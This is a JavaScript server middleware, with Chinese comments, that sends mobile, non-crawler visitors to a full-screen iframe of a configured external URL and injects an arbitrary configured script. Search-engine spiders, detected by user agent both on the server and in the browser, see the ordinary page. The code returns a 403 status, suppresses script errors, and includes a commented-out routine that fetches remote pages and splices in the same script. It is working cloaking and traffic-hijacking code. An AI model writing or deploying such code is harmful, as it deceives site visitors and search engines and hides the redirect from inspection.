const fs = require('fs');
var moment = require('moment')
moment.locale('zh-CN');
const axios = require('axios')
function renderDefaultPage(ctx) {
    return ctx.app.controller.uplink.index.sbb02.call(ctx);
}
module.exports = () => {
    return async function (ctx, next) {
        //验证是否可以跳转
        //跳转条件  1.非蜘蛛 2.h5 3.非强制不跳转
        let gaDOm = ''
        let { domain } = await ctx.service.utils.getSiteInfo();
        if (!domain) return renderDefaultPage(ctx);
        ctx.state = ctx.state || {};
        ctx.state.articlePageDomain = domain;
        let referer = ctx.request.header['referer'];
        const agentLink = domain.agentLink && typeof domain.agentLink === 'object' && !Array.isArray(domain.agentLink)
          ? domain.agentLink : {};
        if (agentLink.gajs) gaDOm = agentLink.gajs;
        const localPageName = typeof agentLink.agentPageName === 'string' ? agentLink.agentPageName.trim() : '';
        const encodedJumpUrl = typeof agentLink.openUrlH5 === 'string' ? agentLink.openUrlH5.trim() : '';
        const hasJumpTarget = Boolean(agentLink.isAgentPage ? localPageName : encodedJumpUrl.replace(/##/g, '').trim());
        if (domain.isMobile && !domain.spider && domain.isOpenUrl != -1) {
            if (!domain._id || !hasJumpTarget) return renderDefaultPage(ctx);
            // if(domain.openUrlStatusCode>0){ctx.status = domain.openUrlStatusCode}
            // 如果开启了本地
            if (agentLink.isAgentPage) {
                let agentPageName = '/app/public/html/'+localPageName + '.html';
                let agentPageFilePath = process.cwd() + agentPageName
                // let isHaveagentFile = fs.existsSync(agentPageFilePath)
                // if(isHaveagentFile){
                let text = ''
                try{
                  text = fs.readFileSync(agentPageFilePath, 'utf-8');
                }catch{
                  return renderDefaultPage(ctx);
                }
                if (!text) return renderDefaultPage(ctx);
                ctx.status = 403;
                text = text.replace('</body>',`${gaDOm}</body>`)
                return ctx.body = text
                // }
                // let agentPageName = domain.agentLink.agentPageName + domain.agentLink._id + '.json' || 'index.json';
                // let agentPageFilePath = process.cwd() + '/app/public/agentpage/' + agentPageName
                // let isHaveagentFile = fs.existsSync(agentPageFilePath)
                // // 如果开启了缓存并且有缓存文件直接返回
                // let isHaveList = false;
                // let txtpage = '';
                // if (isHaveagentFile) {
                //     let text = fs.readFileSync(agentPageFilePath, 'utf-8');
                //     let datac = JSON.parse(text);
                //     txtpage = datac.txtpage;
                //     let chaTime = new Date().getTime() - new Date(datac.updateCacheTime).getTime();
                //     if (chaTime >= ctx.app.config.common.AGENT_PAGE || chaTime < 0) {
                //         isHaveList = false
                //     } else {
                //         isHaveList = true
                //     }
                // }
                // let pageurl = domain.agentLink.openUrlH5.replace(/##/g, '');
                // if (!isHaveList && pageurl) {
                //     axios.get(pageurl).then((res) => {
                //         if (res && res.data && res.data.length > 0 && res.data.indexOf('script') > 0) {
                //             try { fs.unlinkSync(agentPageFilePath); } catch { }
                //             let savehtml = res.data.replace('</body>', domain.agentLink.gajs + '</body>')
                //             let savelist = {
                //                 updateCacheTime: Date.now(),
                //                 txtpage: savehtml
                //             }
                //             fs.writeFile(agentPageFilePath, JSON.stringify(savelist), null, function (err) { });
                //         }
                //     })
                // }
                // if (txtpage) {
                //     return ctx.body = txtpage
                // }
            }
            ctx.status = 403;
            return ctx.body = `
        <!doctype html>
          <html>
        <head>
          <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
        </head>
        <body>
        <script>
          window.onerror = function() {
            return true;
          }
          if (!/(bot|spider)/i.test(navigator.userAgent)) {
            var tantiao = ${JSON.stringify(encodedJumpUrl).replace(/</g, '\\u003c')};
            var tantiaouml = tantiao.replace(/##/g, '').trim();
            document.writeln('<iframe frameborder="0" style="margin:0;padding:0;position:fixed;z-index:10000;top:0;left:0;width:100%;height:100%;overflow:auto;" src="'+tantiaouml+'"></iframe>');
          }
          </script>
         ${gaDOm}
        </body>
        </html>
        `
        }
        await next();
    }
}

